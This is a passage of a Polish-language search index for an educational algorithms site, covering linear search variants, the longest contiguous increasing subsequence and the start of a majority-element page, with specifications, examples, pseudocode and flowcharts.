wi\u0119c sprawdzenie, czy w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107. Zacznijmy od tanecznego wyszukiwania, formalnej specyfikacji i kilku przyk\u0142ad\u00f3w.</p>"},{"location":"algorithms/searching/linear-search/#taneczne-wyszukiwanie","title":"Taneczne wyszukiwanie","text":"<p> Taneczne wyszukiwanie liniowe</p>"},{"location":"algorithms/searching/linear-search/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/searching/linear-search/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba naturalna, liczba element\u00f3w w tablicy</li> <li>\\(A[1..n]\\) \u2014 tablica n warto\u015bci ca\u0142kowitych</li> <li>\\(k\\) \u2014 liczba ca\u0142kowita, szukana warto\u015b\u0107</li> </ul>"},{"location":"algorithms/searching/linear-search/#wynik","title":"Wynik","text":"<ul> <li>Warto\u015b\u0107 PRAWDA, je\u017celi warto\u015b\u0107 \\(k\\) znajduje si\u0119 w tablicy \\(A\\), lub FA\u0141SZ w przeciwnym przypadku</li> </ul>"},{"location":"algorithms/searching/linear-search/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithms/searching/linear-search/#dane_1","title":"Dane","text":"<pre><code>n := 5\nA := [5, 2, 7, 9, 1]\nk := 7 \n</code></pre> <p>Wynik: PRAWDA</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Poszukiwana warto\u015b\u0107 w tablicy to \\(7\\). Jak wida\u0107, ta warto\u015b\u0107 znajduje si\u0119 w tablicy, st\u0105d te\u017c wynik to PRAWDA.</p>"},{"location":"algorithms/searching/linear-search/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithms/searching/linear-search/#dane_2","title":"Dane","text":"<pre><code>n := 5\nA := [5, 2, 7, 9, 1]\nk := 3\n</code></pre> <p>Wynik: FA\u0141SZ</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Poszukujemy warto\u015bci \\(3\\), kt\u00f3ra nie wyst\u0119puje w tablicy. Dlatego wynik to FA\u0141SZ.</p>"},{"location":"algorithms/searching/linear-search/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Znamy ju\u017c problem, teraz pytanie brzmi, jak go rozwi\u0105za\u0107? Jaki algorytm skonstruujemy? Wiemy, \u017ce chodzi o algorytm przeszukiwania liniowego, czyli sprawdzania element\u00f3w jeden po drugim. I dok\u0142adnie to musimy zrobi\u0107. B\u0119dziemy przegl\u0105da\u0107 elementy od pierwszego do ostatniego. Ka\u017cdy kolejny element z tablicy b\u0119dziemy por\u00f3wnywa\u0107 z poszukiwan\u0105 warto\u015bci\u0105. </p> <p>Teraz pytanie brzmi: co zrobimy, gdy natrafimy na poszukiwany element? Odpowied\u017a jest stosunkowo prosta. Gdy stwierdzimy, \u017ce poszukiwany element znajduje si\u0119 w tablicy (czyli gdy go znajdziemy), to nale\u017cy zwr\u00f3ci\u0107 stosowny wynik, czyli warto\u015b\u0107 PRAWDA. I co robimy dalej? C\u00f3\u017c, w tym momencie mo\u017cemy ju\u017c zako\u0144czy\u0107 obliczenia, poniewa\u017c stwierdzili\u015bmy istnienie elementu w tablicy. Tak wi\u0119c otrzepujemy r\u0119ce i ko\u0144czymy, dobra robota!</p> <p>Pozostaje nam jeszcze jednak do rozwa\u017cenia sytuacja, w kt\u00f3rej poszukiwany element nie wyst\u0119puje w tablicy. Co zrobimy w takim przypadku? Oczywi\u015bcie powinni\u015bmy zwr\u00f3ci\u0107 warto\u015b\u0107 FA\u0141SZ, ale jak stwierdzi\u0107, \u017ce elementu nie ma w tablicy? Zastan\u00f3wmy si\u0119 nad tym chwil\u0119. Gdy znajdziemy element w tablicy to zwracamy warto\u015b\u0107 PRAWDA i ko\u0144czymy dzia\u0142anie. Gdy nie znajdziemy elementu w tablicy, to nie zwr\u00f3cimy warto\u015bci PRAWDA i po prostu sprawdzimy wszystkie elementy tablicy. </p> <p>W takim razie, gdy sprawdzimy ju\u017c wszystkie elementy tablicy i nadal b\u0119dziemy wykonywa\u0107 kolejne operacje (poniewa\u017c nie zako\u0144czyli\u015bmy wcze\u015bniej dzia\u0142ania) b\u0119dzie to oznacza\u0142o, \u017ce nie znale\u017ali\u015bmy elementu w tablicy! W takim razie zwracamy FA\u0141SZ i ko\u0144czymy dzia\u0142anie. </p> <p>Warning</p> <p>Zwr\u00f3\u0107 uwag\u0119 na to, \u017ce warto\u015b\u0107 FA\u0141SZ nale\u017cy zwr\u00f3ci\u0107 po sprawdzeniu wszystkich element\u00f3w tablicy, czyli po wyj\u015bciu z p\u0119tli.</p>"},{"location":"algorithms/searching/linear-search/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja SzukajLiniowo(n, A, k)\n    1. Od i := 1 do n, wykonuj:\n        2. Je\u017celi k = A[i], to:\n            3. Zwr\u00f3c PRAWDA\n\n    4. Zwr\u00f3\u0107 FA\u0141SZ\n</code></pre>"},{"location":"algorithms/searching/linear-search/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SzukajLiniowo(n, A, k)\"]) --&gt; B[i := 1]\n    B --&gt; C{i &lt;= n}\n    C -- FA\u0141SZ --&gt; D[/Zwr\u00f3c FA\u0141SZ/]\n    C -- PRAWDA --&gt; E{\"k = A[i]\"}\n    E -- PRAWDA --&gt; F[/Zwr\u00f3c PRAWDA/]\n    E -- FA\u0141SZ --&gt; G[i := i + 1]\n    G --&gt; C\n    D --&gt; STOP([STOP])\n    F --&gt; STOP</code></pre>"},{"location":"algorithms/searching/linear-search/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>G\u0142\u00f3wnym elementem algorytmu jest p\u0119tla przechodz\u0105ca po kolei przez wszystkie warto\u015bci w tablicy. Ta p\u0119tla wykonuje dok\u0142adnie \\(n\\) powt\u00f3rze\u0144. St\u0105d te\u017c otrzymujemy z\u0142o\u017cono\u015b\u0107 liniow\u0105.</p> <p>\\(O(n)\\) \u2014 liniowa</p>"},{"location":"algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":"<p>Czasami nie wystarczy nam informacja, \u017ce element gdzie\u015b si\u0119 znajduje. Czasem musimy dok\u0142adnie wiedzie\u0107, w kt\u00f3rym miejscu jest. Innymi s\u0142owy, chcemy pozna\u0107 po\u0142o\u017cenie, czy te\u017c indeks w tablicy, pod kt\u00f3rym znajduje si\u0119 poszukiwana warto\u015b\u0107 (je\u017celi oczywi\u015bcie w og\u00f3le znajduje si\u0119 w tablicy). Zacznijmy od formalnej specyfikacji i kilku przyk\u0142ad\u00f3w.</p> <p>Warning</p> <p>Szukana warto\u015b\u0107 mo\u017ce wyst\u0119powa\u0107 w tablicy wielokrotnie. Nas jednak na pocz\u0105tek interesuje jej dowolne po\u0142o\u017cenie. </p>"},{"location":"algorithms/searching/linear-search/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"algorithms/searching/linear-search/#dane_3","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba naturalna, liczba element\u00f3w w tablicy</li> <li>\\(A[1..n]\\) \u2014 tablica n warto\u015bci ca\u0142kowitych</li> <li>\\(k\\) \u2014 liczba ca\u0142kowita, szukana warto\u015b\u0107</li> </ul>"},{"location":"algorithms/searching/linear-search/#wynik_1","title":"Wynik","text":"<ul> <li>Indeks dowolnego wyst\u0105pienia warto\u015bci \\(k\\) w tablicy \\(A\\), lub \\(-1\\) je\u017celi tej warto\u015bci nie ma w tablicy</li> </ul>"},{"location":"algorithms/searching/linear-search/#przykad-1_1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithms/searching/linear-search/#dane_4","title":"Dane","text":"<pre><code>n := 5\nA := [5, 2, 7, 9, 1]\nk := 7 \n</code></pre> <p>Wynik: \\(3\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Poszukiwana warto\u015b\u0107 w tablicy to \\(7\\). Jak wida\u0107, ta warto\u015b\u0107 znajduje si\u0119 na trzecim miejscu w tablicy, st\u0105d te\u017c wynik wynosi \\(3\\).</p>"},{"location":"algorithms/searching/linear-search/#przykad-2_1","title":"Przyk\u0142ad 2","text":""},{"location":"algorithms/searching/linear-search/#dane_5","title":"Dane","text":"<pre><code>n := 5\nA := [5, 2, 7, 9, 1]\nk := 3\n</code></pre> <p>Wynik: \\(-1\\)</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Poszukujemy warto\u015bci \\(3\\), kt\u00f3ra nie wyst\u0119puje w tablicy. Dlatego wynik to \\(-1\\).</p>"},{"location":"algorithms/searching/linear-search/#rozwiazanie_1","title":"Rozwi\u0105zanie","text":"<p>Do skonstruowania rozwi\u0105zania tego problemu skorzystamy z poprzedniego rozwi\u0105zania. Zastan\u00f3wmy si\u0119, jakie s\u0105 r\u00f3\u017cnice pomi\u0119dzy tymi dwoma problemami i co musimy zmieni\u0107.</p> <p>R\u00f3\u017cnic\u0119 tak naprawd\u0119 stanowi\u0105 jedynie warto\u015bci, jakie mamy zwr\u00f3ci\u0107 w wyniku. Poprzednio zwracali\u015bmy PRAWDA, gdy element istnia\u0142 w tablicy. Teraz mamy zwr\u00f3ci\u0107 jego indeks. Oznacza to, \u017ce musimy zmieni\u0107 instrukcj\u0119, w kt\u00f3rej zwracamy wynik PRAWDA (numer 3). Powinni\u015bmy w tym miejscu zwr\u00f3ci\u0107 indeks elementu, jednak sk\u0105d wzi\u0105\u0107 t\u0119 warto\u015b\u0107? Przyjrzyjmy si\u0119 poprzedzaj\u0105cej instrukcji warunkowej. W niej sprawdzamy, czy szukana warto\u015b\u0107 wyst\u0119puje pod aktualnie sprawdzanym indeksem w tablicy. A jaki to jest indeks? Ten indeks okre\u015blany jest przez zmienn\u0105, kt\u00f3ra stanowi licznik naszej p\u0119tli, czyli przez zmienn\u0105 \\(i\\). W takim razie zamiast PRAWDA zwracamy warto\u015b\u0107 zmiennej \\(i\\). Gotowe!</p> <p>Teraz skupmy si\u0119 na drugim mo\u017cliwym wyniku. Przedtem zwracali\u015bmy FA\u0141SZ. Co teraz powinni\u015bmy zwr\u00f3ci\u0107, gdy element nie wyst\u0119puje w tablicy? Wystarczy spojrze\u0107 na specyfikacj\u0119. Zast\u0119pujemy FA\u0141SZ warto\u015bci\u0105 \\(-1\\) i ko\u0144czymy dzia\u0142anie.</p>"},{"location":"algorithms/searching/linear-search/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja SzukajLiniowo(n, A, k)\n    1. Od i := 1 do n, wykonuj:\n        2. Je\u017celi k = A[i], to:\n            3. Zwr\u00f3\u0107 i\n\n    4. Zwr\u00f3\u0107 -1\n</code></pre>"},{"location":"algorithms/searching/linear-search/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SzukajLiniowo(n, A, k)\"]) --&gt; B[i := 1]\n    B --&gt; C{i &lt;= n}\n    C -- FA\u0141SZ --&gt; D[/Zwr\u00f3\u0107 -1/]\n    C -- PRAWDA --&gt; E{\"k = A[i]\"}\n    E -- PRAWDA --&gt; F[/Zwr\u00f3\u0107 i/]\n    E -- FA\u0141SZ --&gt; G[i := i + 1]\n    G --&gt; C\n    D --&gt; STOP([STOP])\n    F --&gt; STOP</code></pre>"},{"location":"algorithms/searching/linear-search/#zozonosc_1","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n)\\) \u2014 liniowa</p>"},{"location":"algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":"<p>Wiemy ju\u017c jak sprawdzi\u0107, czy warto\u015b\u0107 wyst\u0119puje w tablicy, a tak\u017ce jak j\u0105 w tej tablicy namierzy\u0107. Co jednak w przypadku, gdy chcemy pozna\u0107 wszystkie wyst\u0105pienia poszukiwanego elementu w tablicy? Teraz zajmiemy si\u0119 takim w\u0142a\u015bnie problemem.</p>"},{"location":"algorithms/searching/linear-search/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"algorithms/searching/linear-search/#dane_6","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba naturalna, liczba element\u00f3w w tablicy</li> <li>\\(A[1..n]\\) \u2014 tablica n warto\u015bci ca\u0142kowitych</li> <li>\\(k\\) \u2014 liczba ca\u0142kowita, szukana warto\u015b\u0107</li> </ul>"},{"location":"algorithms/searching/linear-search/#wynik_2","title":"Wynik","text":"<ul> <li>Lista wszystkich indeks\u00f3w, pod kt\u00f3rymi znajduje si\u0119 warto\u015b\u0107 \\(k\\) w tablicy \\(A\\)</li> </ul>"},{"location":"algorithms/searching/linear-search/#przykad-1_2","title":"Przyk\u0142ad 1","text":""},{"location":"algorithms/searching/linear-search/#dane_7","title":"Dane","text":"<pre><code>n := 5\nA := [7, 2, 7, 9, 7]\nk := 7 \n</code></pre> <p>Wynik: \\([1, 3, 5]\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Poszukiwana warto\u015b\u0107 w tablicy to \\(7\\). Jak wida\u0107, ta warto\u015b\u0107 znajduje si\u0119 na pierwszym, trzecim oraz ostatnim (pi\u0105tym) miejscu w tablicy.</p>"},{"location":"algorithms/searching/linear-search/#przykad-2_2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithms/searching/linear-search/#dane_8","title":"Dane:","text":"<pre><code>n := 5\nA := [7, 2, 7, 9, 7]\nk := 3 \n</code></pre> <p>Wynik: \\([\\ ]\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Poszukiwana warto\u015b\u0107 w tablicy to \\(3\\). Jak wida\u0107, ta warto\u015b\u0107 nie wyst\u0119puje w tablicy, st\u0105d te\u017c wynik jest pusty, poniewa\u017c lista indeks\u00f3w jest pusta.</p>"},{"location":"algorithms/searching/linear-search/#rozwiazanie_2","title":"Rozwi\u0105zanie","text":"<p>W og\u00f3lno\u015bci zwr\u00f3cenie listy, czy te\u017c tablicy jako wynik dzia\u0142ania bywa problematyczne, w zale\u017cno\u015bci od j\u0119zyka programowania. Dlatego skupimy si\u0119 na czym\u015b podobnym, tzn. wypiszemy wszystkie wyniki na ekranie.</p> <p>Zastan\u00f3wmy si\u0119, jak zmodyfikowa\u0107 poprzednie rozwi\u0105zanie. Jakie s\u0105 r\u00f3\u017cnice pomi\u0119dzy t\u0105 wersj\u0105 problemu, a poprzedni\u0105, w kt\u00f3rej jako wynik zwracali\u015bmy indeks tylko jednego, pierwszego wyst\u0105pienia warto\u015bci w tablicy. </p> <p>Po pierwsze, teraz chcemy wypisa\u0107 wszystkie indeksy, pod kt\u00f3rymi pojawia si\u0119 szukana warto\u015b\u0107. W takim razie nie mo\u017cemy ko\u0144czy\u0107 dzia\u0142ania po znalezieniu pierwszego wyst\u0105pienia, musimy i\u015b\u0107 dalej. M\u00f3wi\u0105c dok\u0142adniej, musimy przejrze\u0107 ca\u0142\u0105 tablic\u0119. Dokonajmy wi\u0119c dw\u00f3ch zmian w instrukcji 3: zamiast zwr\u00f3\u0107 zrobimy wypisz i usuniemy polecenie zako\u0144cz.</p> <p>Potrzebujemy dokona\u0107 jeszcze jednej zmiany. Zauwa\u017cmy, \u017ce teraz nie musimy si\u0119 zastanawia\u0107 nad tym, co zrobi\u0107 w przypadku, gdy poszukiwany element nie wyst\u0119puje w tablicy. W takim przypadku po prostu nic nie wypiszemy na ekran. Dlatego usuwamy ostatni\u0105 instrukcj\u0119 (numer 4), w kt\u00f3rej zwracamy wynik -1.</p>"},{"location":"algorithms/searching/linear-search/#pseudokod_2","title":"Pseudokod","text":"<pre><code>procedura SzukajLiniowo(n, A, k):\n    1. Od i := 1 do n, wykonuj:\n        2. Je\u017celi k = A[i], to:\n            3. Wypisz i\n</code></pre>"},{"location":"algorithms/searching/linear-search/#schemat-blokowy_2","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SzukajLiniowo(n, A, k)\"]) --&gt; B[i := 1]\n    B --&gt; C{i &lt;= n}\n    C -- FA\u0141SZ ---&gt; STOP([STOP])\n    C -- PRAWDA --&gt; E{\"k = A[i]\"}\n    E -- PRAWDA --&gt; F[/Wypisz i/]\n    E -- FA\u0141SZ --&gt; G[i := i + 1]\n    F --&gt; G\n    G --&gt; C</code></pre>"},{"location":"algorithms/searching/linear-search/#zozonosc_2","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n)\\) \u2014 liniowa</p>"},{"location":"algorithms/searching/linear-search/#implementacje-gowne","title":"Implementacje \u2014 g\u0142\u00f3wne","text":""},{"location":"algorithms/searching/linear-search/#pascal","title":"Pascal","text":""},{"location":"algorithms/searching/linear-search/#c","title":"C++","text":""},{"location":"algorithms/searching/linear-search/#python","title":"Python","text":""},{"location":"algorithms/searching/linear-search/#blockly","title":"Blockly","text":""},{"location":"algorithms/searching/linear-search/#implementacje-pozostae","title":"Implementacje \u2014 pozosta\u0142e","text":""},{"location":"algorithms/searching/linear-search/#_1","title":"Wyszukiwanie liniowe","text":""},{"location":"algorithms/searching/linear-search/#dart","title":"Dart","text":""},{"location":"algorithms/searching/linear-search/#elixir","title":"Elixir","text":""},{"location":"algorithms/searching/linear-search/#go","title":"Go","text":""},{"location":"algorithms/searching/linear-search/#haskell","title":"Haskell","text":""},{"location":"algorithms/searching/linear-search/#javascript","title":"JavaScript","text":""},{"location":"algorithms/searching/linear-search/#julia","title":"Julia","text":""},{"location":"algorithms/searching/linear-search/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/searching/linear-search/#lua","title":"Lua","text":""},{"location":"algorithms/searching/linear-search/#rust","title":"Rust","text":""},{"location":"algorithms/searching/linear-search/#scheme","title":"Scheme","text":""},{"location":"algorithms/searching/linear-search/#swift","title":"Swift","text":""},{"location":"algorithms/searching/linear-search/#typescript","title":"TypeScript","text":""},{"location":"algorithms/searching/linear-search/#visual-basic","title":"Visual Basic","text":""},{"location":"algorithms/searching/longest-growing-substring/","title":"Najd\u0142u\u017cszy sp\u00f3jny podci\u0105g rosn\u0105cy","text":"<p>Sp\u00f3jny podci\u0105g danego ci\u0105gu to taki, kt\u00f3ry sk\u0142ada si\u0119 z element\u00f3w wyst\u0119puj\u0105cych jeden obok drugiego. To tak, jakby\u015bmy wzi\u0119li \u015bwi\u0105teczny \u0142a\u0144cuch i wycieli jego kawa\u0142ek. Ten wyci\u0119ty, sp\u00f3jny kawa\u0142ek \u0142a\u0144cucha b\u0119dzie w\u0142a\u015bnie sp\u00f3jnym podci\u0105giem, czy te\u017c, w tym przypadku, sp\u00f3jnym pod\u0142a\u0144cuchem.</p> <p>Sp\u00f3jny podci\u0105g rosn\u0105cy to taki sp\u00f3jny podci\u0105g, w kt\u00f3rym ka\u017cdy kolejny element jest wi\u0119kszy od poprzedniego.</p> <p>Problem sp\u00f3jnego podci\u0105gu rosn\u0105cego rozwa\u017cymy na przyk\u0142adzie ci\u0105gu, czy te\u017c tablicy liczb ca\u0142kowitych. Zacznijmy od formalnej specyfikacji problemu i prostego przyk\u0142adu.</p>"},{"location":"algorithms/searching/longest-growing-substring/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/searching/longest-growing-substring/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, liczba element\u00f3w tablicy</li> <li>\\(tab[1..n]\\) - tablica zawieraj\u0105ca \\(n\\) liczb ca\u0142kowitych</li> </ul>"},{"location":"algorithms/searching/longest-growing-substring/#wynik","title":"Wynik","text":"<ul> <li>D\u0142ugo\u015b\u0107 najd\u0142u\u017cszego sp\u00f3jnego podci\u0105gu rosn\u0105cego w tablicy \\(tab\\) </li> </ul>"},{"location":"algorithms/searching/longest-growing-substring/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/searching/longest-growing-substring/#dane_1","title":"Dane","text":"<pre><code>n := 10\ntab := [4, 9, 7, 2, 4, 7, 9, 3, 8, 6]\n</code></pre>"},{"location":"algorithms/searching/longest-growing-substring/#wynik_1","title":"Wynik","text":"<p>\\(4\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>W podanej tablicy mamy kilka sp\u00f3jnych podci\u0105g\u00f3w rosn\u0105cych. Wypiszmy wszystkie pe\u0142ne sp\u00f3jne podci\u0105gi rosn\u0105ce (tzn. takie, kt\u00f3rych ju\u017c nie mo\u017cna powi\u0119kszy\u0107):</p> <ul> <li>\\(4, 9\\)</li> <li>\\(7\\)</li> <li>\\(2, 4, 7, 9\\)</li> <li>\\(3, 8\\)</li> <li>\\(6\\)</li> </ul> <p>Jak wida\u0107 najd\u0142u\u017cszy z nich ma d\u0142ugo\u015b\u0107 r\u00f3wn\u0105 \\(4\\) i jest to podci\u0105g: \\(2, 4, 7, 9\\).</p>"},{"location":"algorithms/searching/longest-growing-substring/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Zastan\u00f3wmy si\u0119 na pocz\u0105tku, jak podeszliby\u015bmy do tego problemu na papierze. Mamy dany pewien ci\u0105g liczb i chcemy odnale\u017a\u0107 najd\u0142u\u017cszy sp\u00f3jny podci\u0105g rosn\u0105cy. To, co mo\u017cemy zrobi\u0107, to wypisa\u0107 wszystkie pe\u0142ne sp\u00f3jne podci\u0105gi rosn\u0105ce. Jak to zrobi\u0107? Pomys\u0142 jest prosty. Najpierw zapisujemy sobie pierwsz\u0105 warto\u015b\u0107 z ci\u0105gu. Nast\u0119pnie idziemy od lewej do prawej, liczba po liczbie, zaczynaj\u0105c od drugiej w kolejno\u015bci. Por\u00f3wnujemy j\u0105 z ostatni\u0105 zapisan\u0105. Je\u017celi jest wi\u0119ksza, to dopisujemy j\u0105 obok (dopisuj\u0105c do podci\u0105gu). Je\u017celi jest mniejsza lub r\u00f3wna, to zapisujemy j\u0105 poni\u017cej (rozpoczynaj\u0105c nowy podci\u0105g). Po wypisaniu wszystkich podci\u0105g\u00f3w pozostanie nam znalezienie najd\u0142u\u017cszego, policzenie jego d\u0142ugo\u015bci i mamy wynik. Zadanie rozwi\u0105zane!</p> <p>Zauwa\u017cmy jednak, \u017ce nie musimy wcale wypisywa\u0107 tych podci\u0105g\u00f3w, ani nawet ich zna\u0107. Jako rozwi\u0105zanie mamy poda\u0107 jedynie d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego sp\u00f3jnego podci\u0105gu rosn\u0105cego. W takim razie wystarczy, \u017ce zapami\u0119tamy d\u0142ugo\u015b\u0107 obecnie sprawdzanego podci\u0105gu i d\u0142ugo\u015b\u0107 dotychczas znalezionego najd\u0142u\u017cszego podci\u0105gu. Post\u0119powa\u0107 b\u0119dziemy podobnie, jak opisali\u015bmy wy\u017cej. Zaczynamy od zapami\u0119tania obecnej d\u0142ugo\u015bci, kt\u00f3rej warto\u015b\u0107 wynosi \\(1\\), poniewa\u017c wliczamy na razie tylko pierwszy element tablicy do naszego podci\u0105gu. Zapami\u0119tujemy tak\u017ce d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego dot\u0105d znalezionego podci\u0105gu, kt\u00f3ra tak\u017ce wynosi \\(1\\), poniewa\u017c tylko tak\u0105 d\u0142ugo\u015b\u0107 do tej pory mamy. Teraz przechodzimy po kolejnych elementach tablicy, zaczynaj\u0105c od drugiego elementu. Por\u00f3wnujemy obecny element tablicy z poprzednim. Je\u017celi jest od niego wi\u0119kszy, to znaczy \u017ce dodajemy go do naszego podci\u0105gu rosn\u0105cego, wi\u0119c zwi\u0119kszamy pami\u0119tan\u0105 d\u0142ugo\u015b\u0107 obecnego ci\u0105gu o jeden. Por\u00f3wnujemy tak\u017ce obecn\u0105 d\u0142ugo\u015b\u0107 z dotychczasow\u0105 maksymaln\u0105 d\u0142ugo\u015bci\u0105 i, je\u017celi nasza obecna jest wi\u0119ksza, to zapami\u0119tujemy j\u0105 jako maksymaln\u0105 d\u0142ugo\u015b\u0107. Je\u017celi jednak nasz obecny element nie jest wi\u0119kszy od poprzedniego, to znaczy \u017ce musimy zacz\u0105\u0107 kolejny podci\u0105g rosn\u0105cy, wi\u0119c zmieniamy d\u0142ugo\u015b\u0107 obecnego podci\u0105gu na jeden. Na koniec, po przej\u015bciu przez wszystkie elementy tablicy, wystarczy zwr\u00f3ci\u0107 zapami\u0119tan\u0105 maksymaln\u0105 d\u0142ugo\u015b\u0107.</p> <p>Info</p> <p>Dla lepszego zrozumienia spr\u00f3buj wykona\u0107 opisan\u0105 procedur\u0119 na kilku przyk\u0142adach.</p>"},{"location":"algorithms/searching/longest-growing-substring/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja NajdluzszySpojnyPodciagRosnacy(n, tab):\n    1. maks := 1\n    2. dlugosc := 1\n    3. Od i := 2 do n, wykonuj:\n        4. Je\u017celi tab[i] &gt; tab[i - 1], to:\n            5. dlugosc := dlugosc + 1\n            6. Je\u017celi dlugosc &gt; maks, to:\n                7. maks := dlugosc\n        8. W przeciwnym przypadku:\n            9. dlugosc := 1\n    10. Zwr\u00f3\u0107 maks\n</code></pre>"},{"location":"algorithms/searching/longest-growing-substring/#opis","title":"Opis","text":"<p>Funkcja przyjmuje dwa parametry, zgodnie ze specyfikacj\u0105. Na pocz\u0105tku zaczynamy od utworzenia dw\u00f3ch zmiennych pomocniczych: maksymalnej d\u0142ugo\u015bci dot\u0105d znalezionych podci\u0105g\u00f3w (krok 1) oraz d\u0142ugo\u015bci obecnie sprawdzanego podci\u0105gu (krok 2). Nast\u0119pnie przechodzimy p\u0119tl\u0105 przez kolejne indeksy tablicy poczynaj\u0105c od drugiego elementu (krok 3). W p\u0119tli por\u00f3wnujemy element pod obecnie sprawdzanym indeksem z poprzednim elementem z tablicy (krok 4). Je\u017celi obecny element jest wi\u0119kszy od poprzedniego, to zwi\u0119kszamy d\u0142ugo\u015b\u0107 obecnie sprawdzanego podci\u0105gu o jeden (krok 5) oraz por\u00f3wnujemy j\u0105 z maksymaln\u0105 d\u0142ugo\u015bci\u0105 dot\u0105d znalezionych podci\u0105g\u00f3w (krok 6). Je\u017celi obecna d\u0142ugo\u015b\u0107 jest wi\u0119ksza od tej maksymalnej, to zapami\u0119tujemy obecn\u0105 d\u0142ugo\u015b\u0107 jako maksymaln\u0105 (krok 7).</p> <p>Je\u017celi obecny element nie jest wi\u0119kszy od poprzedniego (krok 8), to resetujemy d\u0142ugo\u015b\u0107 obecnie sprawdzanego podci\u0105gu ustawiaj\u0105c jej warto\u015b\u0107 \\(1\\) (krok 9). Na ko\u0144cu, po wyj\u015bciu z p\u0119tli, zwracamy jako wynik funkcji maksymaln\u0105 d\u0142ugo\u015b\u0107 sp\u00f3jnego podci\u0105gu rosn\u0105cego (krok 9).</p>"},{"location":"algorithms/searching/longest-growing-substring/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"NajdluzszySpojnyPodciagRosnacy(n, A)\"]) --&gt; K1[\"maks := 1\n    dlugosc := 1\n    i := 2\"]\n    K1 --&gt; K3{i &lt;= n}\n    K3 -- PRAWDA --&gt; K4{\"A[i] &gt; A[i - 1]\"}\n    K4 -- PRAWDA --&gt; K5[dlugosc := dlugosc + 1]\n    K5 --&gt; K6{dlugosc &gt; maks}\n    K6 -- PRAWDA --&gt; K7[maks := dlugosc]\n    K4 -- FA\u0141SZ --&gt; K9[dlugosc := 1]\n    K9 --&gt; K3i[i := i + 1]\n    K6 -- FA\u0141SZ --&gt; K3i\n    K7 --&gt; K3i\n    K3i --&gt; K3\n    K3 -- FA\u0141SZ ---&gt; K10[\\Zwr\u00f3\u0107 maks\\]\n    K10 ----&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/searching/longest-growing-substring/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n)\\) - liniowa</p> <p>Mamy jedn\u0105 p\u0119tl\u0119, kt\u00f3ra przechodzi przez kolejne elementy tablicy, kt\u00f3rej d\u0142ugo\u015b\u0107 wynosi \\(n\\). W zwi\u0105zku z tym mamy z\u0142o\u017cono\u015b\u0107 liniow\u0105.</p>"},{"location":"algorithms/searching/longest-growing-substring/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/searching/longest-growing-substring/#c","title":"C++","text":""},{"location":"algorithms/searching/longest-growing-substring/#python","title":"Python","text":""},{"location":"algorithms/searching/longest-growing-substring/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/searching/longest-growing-substring/#implementacje-pozostae","title":"Implementacje \u2014 pozosta\u0142e","text":""},{"location":"algorithms/searching/longest-growing-substring/#_1","title":"Najd\u0142u\u017cszy sp\u00f3jny podci\u0105g rosn\u0105cy","text":""},{"location":"algorithms/searching/longest-growing-substring/#julia","title":"Julia","text":""},{"location":"algorithms/searching/majority/","title":"Znajdowanie lidera w zbiorze","text":"<p>Wyobra\u017amy sobie spotkanie w lokalnym klubie mi\u0142o\u015bnik\u00f3w ksi\u0105\u017cek, gdzie ka\u017cdy uczestnik ma przedstawi\u0107 swoj\u0105 ulubion\u0105 powie\u015b\u0107. Po prezentacji ka\u017cdej ksi\u0105\u017cki, uczestnicy wrzucaj\u0105 do urny kartk\u0119 z tytu\u0142em wybranej przez siebie powie\u015bci. Po zako\u0144czonym spotkaniu chcemy dowiedzie\u0107 si\u0119, czy jest taka ksi\u0105\u017cka, kt\u00f3ra zdoby\u0142a serca wi\u0119kszo\u015bci uczestnik\u00f3w.</p> <p>Lider zbioru to element (w tym przypadku tytu\u0142 ksi\u0105\u017cki), kt\u00f3ry pojawia si\u0119 w zbiorze wi\u0119cej ni\u017c 